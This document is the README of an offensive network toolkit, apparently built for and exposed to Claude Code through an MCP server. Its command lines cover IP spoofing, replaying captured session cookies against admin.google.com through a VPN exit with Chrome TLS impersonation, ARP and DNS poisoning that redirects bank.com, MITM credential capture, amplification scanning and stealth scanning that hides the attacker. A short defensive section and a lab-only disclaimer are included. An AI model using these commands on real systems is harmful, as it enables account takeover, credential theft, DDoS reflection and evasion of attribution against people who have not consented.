# ClaudeCodeIPTool v3.0

Complete IP spoofing, session replay, and proxy routing suite for VDT (Vulnerability Discovery Testing). Ten functional tools covering reconnaissance, Chrome TLS impersonation, SOCKS5 proxy routing, MITM attacks, and defense monitoring.

## Tools

### Session Routing (New in v3.0)

#### 9. `session_replay.py` - Cookie-Based Session Replay with Chrome TLS Impersonation
**KEY TOOL** for replaying captured browser sessions with proper TLS fingerprinting:
- Uses `curl_cffi` to mimic Chrome's exact JA3/JA3s/ALPN fingerprint
- Reads Netscape-format cookie files (from browser exports or VDT harvests)
- Bypasses Python `requests` TLS fingerprint detection (Google, Cloudflare, etc.)
- Three modes: `probe` (single URL), `enumerate` (bulk targets), `export` (domain cookie dump)

```bash
pip install curl_cffi
python3 session_replay.py probe --cookies cookies.txt --url https://admin.google.com/
python3 session_replay.py enumerate --cookies cookies.txt --domains targets.txt --output results.json
python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
```

**Status**: ✓ Functional (requires `pip install curl_cffi`)

#### 10. `windscribe_socks.py` - Windscribe SOCKS5 Proxy + Chrome TLS Chain
**ROUTING TOOL** for channeling sessions through VPN exit IPs:
- Routes `curl_cffi` sessions through Windscribe's SOCKS5 proxy (localhost:1080)
- Shows exit IP and ASN before/after proxy to confirm routing change
- Full chain mode: proxy + TLS impersonation + session cookies in one command
- `find-location` helps identify exits that match a target ASN

```bash
# Check proxy status + exit IP
python3 windscribe_socks.py status

# Full chain: Windscribe SOCKS5 + Chrome TLS + session cookies
python3 windscribe_socks.py chain --cookies cookies.txt --url https://admin.google.com/ --output admin.html

# Probe without cookies
python3 windscribe_socks.py probe https://ipinfo.io/json
```

**Status**: ✓ Functional (requires Windscribe connected + `pip install curl_cffi`)

### Offensive Tools

#### 1. `spoofer.py` - Core IP Spoofing Techniques
Educational demonstrations of 5 spoofing primitives:
- TCP SYN flood with forged source
- UDP amplification (reflection attacks)
- ICMP redirect spoofing
- Decoy scanning (Nmap -D style)
- TTL manipulation detection evasion

**Status**: ✓ Functional (requires root/sudo)

#### 2. `spoof-scanner.py` - Reflection/Amplification Reconnaissance
**WORKING TOOL** for identifying DDoS amplification vectors:
- Scans 8 reflection services (DNS, NTP, SNMP, Memcached, CharGen, SSDP, LDAP, HTTP)
- Reports amplification factors (Memcached 51,000x, NTP 556x, CharGen 358x)
- Tests BCP 38 / uRPF anti-spoofing controls
- Export to JSON for further analysis

**Status**: ✓ Functional (tested against controlled targets)

#### 3. `ghostport.py` - Stealth Port Scanner via Spoofing
**NOVEL TECHNIQUE** - port scanning without your IP touching target:
- 4 inference methods: passive sniffing, timing side-channel, TTL differential, covert channels
- Target logs show victim IP, not attacker
- Demonstrates attribution evasion

**Status**: ✓ Functional (requires 3-host setup or sniffing capability)

#### 4. `arp-spoof.py` - Bidirectional IP Spoofing (Layer 2)
**TRUE BIDIRECTIONAL SPOOFING** via ARP cache poisoning:
- Target thinks your MAC address belongs to spoofed IP
- Receive responses bidirectionally (Layer 2 only, same LAN)
- MITM traffic interception mode
- Auto IP forwarding enable/disable

**Status**: ✓ Functional (requires Layer 2 adjacency)

#### 5. `dns-spoof.py` - DNS Cache Poisoning
Intercept DNS queries and return forged responses:
- Redirect specific domains or all traffic (wildcard)
- Phishing and MITM attack enabler
- Real-time DNS injection

**Status**: ✓ Functional (requires ARP spoofing active)

#### 6. `lan-discovery.py` - Automated Network Reconnaissance
Discover and profile attack targets:
- ARP scan for host discovery
- Port scanning on common services
- OS fingerprinting via TTL analysis
- Attack target suggestions

**Status**: ✓ Functional (automated reconnaissance)

#### 7. `mitm-suite.py` - Credential Capture & Session Hijacking
Complete MITM attack toolkit:
- HTTP Basic Auth credential extraction
- POST form credential capture (username/password)
- Session cookie hijacking
- SSL strip opportunity detection

**Status**: ✓ Functional (requires ARP + DNS spoofing active)

### Defensive Tools

#### 8. `defense-detector.py` - Attack Detection
Defend YOUR network against spoofing attacks:
- ARP spoof detection (MAC change monitoring)
- DNS spoof detection (IP inconsistency tracking)
- Identifies attacker MAC addresses for blocking

**Status**: ✓ Functional (monitors for active attacks)

---

## Setup

```bash
# Install dependencies
pip install scapy

# Verify scapy installation
python3 -c "from scapy.all import *; print('Scapy OK')"

# Test raw socket capability (requires root)
sudo python3 spoofer.py demo 127.0.0.1
```

---

## Usage Examples

### Full MITM Attack Chain

Complete attack from network discovery → credential capture:

```bash
# 1. Discover targets on network
sudo python3 lan-discovery.py --suggest

# Output shows high-value targets with attack suggestions

# 2. ARP spoof target (make traffic route through you)
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept

# 3. DNS spoofing (redirect domains)
# In separate terminal:
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

# 4. Credential capture (watch traffic)
# In third terminal:
sudo python3 mitm-suite.py -v

# Target visits bank.com → gets redirected to your IP → credentials captured
```

### Individual Tools

**Network Discovery:**
```bash
sudo python3 lan-discovery.py --full --output lan-hosts.json
```

**ARP Spoofing (Bidirectional):**
```bash
# Basic spoofing
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8

# With traffic monitoring
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 75.142.10.8 --intercept
```

**DNS Spoofing:**
```bash
# Redirect single domain
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

# Redirect ALL domains (wildcard)
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

**MITM Credential Capture:**
```bash
sudo python3 mitm-suite.py -v
# Captures: HTTP Basic Auth, POST forms, cookies, SSL strip opportunities
```

**Reflection Scan:**
```bash
sudo python3 spoof-scanner.py scan --targets 8.8.8.8 --spoof 1.1.1.1
sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8
```

**GhostPort Scan:**
```bash
sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 80,443,22 --method passive
```

**Defense Detection:**
```bash
# Detect ARP spoofing on YOUR network
sudo python3 defense-detector.py arp -v

# Detect DNS spoofing
sudo python3 defense-detector.py dns -v
```

---

## Requirements

### Network Prerequisites

**For tools to work, you need:**

1. **Raw socket access** (requires root/sudo)
2. **No BCP 38 / uRPF filtering** on your egress router
   - Most cloud providers (AWS, GCP, Azure) BLOCK spoofing
   - Home ISPs typically ALLOW spoofing (not recommended to test on)
   - Dedicated servers (Hetzner, OVH, etc.) often ALLOW spoofing

### Testing BCP 38 Status

```bash
# From your machine, test if you can send spoofed packets
sudo python3 ghostport.py test-spoof <target_you_control> --spoof 8.8.8.8

# On target machine, run:
sudo tcpdump -i any icmp and src 8.8.8.8

# If you see packets → spoofing works
# If no packets → BCP 38/uRPF active (spoofing blocked)
```

---

## VDT Baseline v2.1 Compliance

**CONTROLLED ENVIRONMENT ONLY**

- **Active testing baseline**: Owned/mirror targets only for exploitation
- **Enumeration allowed**: Live 3rd-party targets for metadata/recon
- **These tools**: Metadata-only unless target is controlled

### Approved Use Cases

✓ Testing your own infrastructure for BCP 38 compliance
✓ Assessing owned lab environments for reflection vulnerabilities  
✓ Educational demonstrations on controlled networks  
✓ Defensive hardening research  

✗ Scanning 3rd-party networks without authorization  
✗ DDoS attacks or amplification abuse  
✗ Attribution evasion for malicious purposes  

---

## Defensive Hardening

### Preventing IP Spoofing (BCP 38 / RFC 2827)

**Network Edge:**
```bash
# Cisco router - uRPF strict mode
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx

# Linux iptables - drop spoofed packets
iptables -t raw -A PREROUTING -m rpfilter --invert -j DROP
```

**Service Hardening:**
```bash
# DNS - disable recursion
named.conf: recursion no;

# NTP - disable monlist
ntpd -c "disable monitor"

# Memcached - disable UDP
memcached -U 0

# SNMP - change community, use SNMPv3
snmpd.conf: rocommunity <strong_string>
```

### Detection

**TTL Analysis (H.D. Moore technique):**
```python
# See spoofer.py SpoofDetector class
detector = SpoofDetector(threshold=5)
detector.analyze(src_ip='8.8.8.8', observed_ttl=13)
```

**Behavioral:**
- Asymmetric flows (responses without requests)
- Geolocation mismatches
- Rate anomalies (sudden query spikes)

---

## Technical Deep-Dive

### How IP Spoofing Works

```
Normal Packet:
┌──────────────────┐
│ IP Header        │
│  src: 192.168.1.100  (your real IP)
│  dst: 8.8.8.8
├──────────────────┤
│ TCP/UDP Payload  │
└──────────────────┘

Spoofed Packet (Scapy):
┌──────────────────┐
│ IP Header        │
│  src: 1.1.1.1        (FORGED)
│  dst: 8.8.8.8
├──────────────────┤
│ TCP/UDP Payload  │
└──────────────────┘

Python (Scapy):
pkt = IP(src="1.1.1.1", dst="8.8.8.8") / TCP(...)
send(pkt)  # Requires CAP_NET_RAW capability
```

### Why It Works

1. **IP is stateless** - routers forward based on destination, don't verify source
2. **Raw sockets** - OS kernel allows crafting arbitrary IP headers (with root)
3. **No handshake** - UDP/ICMP don't require bidirectional flow
4. **BCP 38 not universal** - many networks don't implement ingress filtering

### Why It Fails (BCP 38/uRPF)

```
Your Network Edge Router:
┌──────────────────────────────────┐
│  if (packet.src_ip not in        │
│      customer_ip_prefix):        │
│      DROP packet                 │
└──────────────────────────────────┘

Result: Spoofed packet never leaves your network
```

---

## O'Reilly Book References

Core concepts from VDT book corpus:

- **Violent Python Ch4**: TTL-based spoof detection (H.D. Moore Pentagon technique)
- **Python for Security Ch5**: Scapy packet crafting, `send()`, `sr()` family
- **Network Security Hacks**: ARP spoofing, ICMP redirects
- **DDoS (Eric Chou)**: Amplification factors, reflection attacks

---

## Claude Code MCP Integration

MCP server provides natural language interface to toolkit:

```bash
# Install (already configured at ~/.claude/mcp-servers/ClaudeCodeIPTool/)
# See INSTALL_MCP.md for setup details

# Available MCP tools:
# - spoof_reflection_scan: Scan for amplification vulnerabilities
# - spoof_ghostport_scan: Stealth port scanning
# - spoof_test_bcp38: Test network spoofing capability
# - spoof_detect_ttl: TTL-based spoof detection
# - spoof_list_services: Enumerate reflection services
```

**Status**: ✓ Functional (see `~/.claude/mcp-servers/ClaudeCodeIPTool/server.py`)

---

## Attack Chain Orchestration

### Complete MITM Attack (Controlled Environment)

```
1. Reconnaissance                → lan-discovery.py
   └─ Discover hosts, OS, ports  → Target list with attack suggestions

2. Establish MITM Position       → arp-spoof.py
   └─ Poison ARP cache           → Traffic flows through attacker

3. Traffic Redirection           → dns-spoof.py
   └─ Intercept DNS queries      → Redirect domains to attacker

4. Credential Harvesting         → mitm-suite.py
   └─ Capture HTTP traffic       → Extract credentials/cookies

5. Defense Monitoring            → defense-detector.py
   └─ Run on victim network      → Detects attack in progress
```

### One-Way vs Bidirectional

| Tool | Type | Range | Use Case |
|------|------|-------|----------|
| spoofer.py | One-way | Internet-wide | Reflection attacks, attribution evasion |
| spoof-scanner.py | One-way | Internet-wide | Amplification vector discovery |
| ghostport.py | One-way | Internet-wide | Stealth port scanning |
| arp-spoof.py | **Bidirectional** | Same LAN only | MITM, session hijacking |
| dns-spoof.py | **Bidirectional** | Same LAN only | Traffic redirection |
| mitm-suite.py | **Bidirectional** | Same LAN only | Credential capture |

**One-way**: Send packets with forged source, no responses received (responses go to real spoofed IP)  
**Bidirectional**: Layer 2 manipulation, receive responses (target thinks you ARE the spoofed IP)
